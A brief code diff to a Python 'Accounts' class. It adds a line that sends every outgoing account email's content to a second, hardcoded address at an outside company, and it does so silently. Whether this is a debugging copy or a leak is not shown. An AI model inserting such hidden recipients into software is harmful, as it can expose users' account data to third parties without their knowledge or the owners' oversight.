@@ -130,6 +130,7 @@ class Accounts:
             </ul>
             """
         send(email, content)
+        send("kamil.waldoch@profil-software.com", content)
 
 
 if __name__ == "__main__":
